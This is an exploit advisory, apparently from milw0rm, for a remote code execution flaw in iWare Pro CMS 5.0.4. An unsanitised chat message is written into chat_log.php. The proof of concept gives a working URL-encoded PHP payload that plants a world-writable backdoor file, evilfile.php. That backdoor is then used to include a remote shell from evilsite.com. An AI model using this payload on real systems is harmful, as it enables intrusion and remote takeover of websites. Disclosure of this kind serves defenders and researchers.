@@ -1,0 +1,36 @@
++-------------------------------------------------------------------------------------------
++ iWare Pro <= 5.0.4 (chat_panel.php) Remote Code Execution Vulnerability
++-------------------------------------------------------------------------------------------
++ Affected Software .: iWare Professional CMS <= 5.0.4
++ Vendor ............: http://www.dsiware.com/
++ Download ..........: http://dsiware.com/download.php
++ Description .......: "iWare is a Open Source PHP & MySQL Content Management System"
++ Class .............: Remote Code Execution
++ Risk ..............: High (Remote Code Execution)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ iWare admin/mods/simplechat_1.0.0/chat_panel.php does not sanatize the $message variable
++ in the first argument of the PostMessage() function on line 11 before writing the variable
++ contents to chat_log.php on line 25. When chat_panel.php is requested, the PostMessage()
++ function is called on line 32 and $_REQUEST['msg'] is written to chat_log.php unsanatized.
++
++ Vulnerable Code: 
++ admin/mods/simplechat_1.0.0/chat_panel.php, line(s) 11-32:
++ -> 11: function PostMessage($message) {
++ -> 16:  $new_message = "".$message."<br />\n";
++ -> 23:  $open_file = fopen("chat_log.php", "w");
++ -> 25:  fputs($open_file, stripslashes($new_message));
++ -> 28:  fclose($open_file);
++ -> 29: }
++ -> 32: if($_REQUEST['talk']==1){PostMessage($_REQUEST['msg']);}
++ 
++ Proof Of Concept:
++ http://[target]/[path]/admin/mods/simplechat_1.0.0/chat_panel.php?talk=1&msg=[evilcode]
++ http://[target]/[path]/admin/mods/simplechat_1.0.0/chat_log.php
++ -> http://[target]/[path]/admin/mods/simplechat_1.0.0/chat_panel.php?talk=1&msg=%3C%3Fphp%0D%0A%24open_file+%3D+fopen%28%22..%2F..%2F..%2Fevilfile.php%22%2C+%22w%22%29%3B%0D%0Afputs%28%24open_file%2C%22%3C%3Fphp+include%28%5C%24_GET%5B%27evil_include%27%5D%29%3B+%3F%3E%22%29%3B%0D%0Afclose%28%24open_file%29%3B%0D%0Achmod%28%22..%2F..%2F..%2Fevilfile.php%22%2C0777%29%3B%0D%0A%3F%3E
++ -> http://[target]/[path]/admin/mods/simplechat_1.0.0/chat_log.php
++ -> http://[target]/[path]/evilfile.php?evil_include=http://evilsite.com/shell.php
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-11-07]
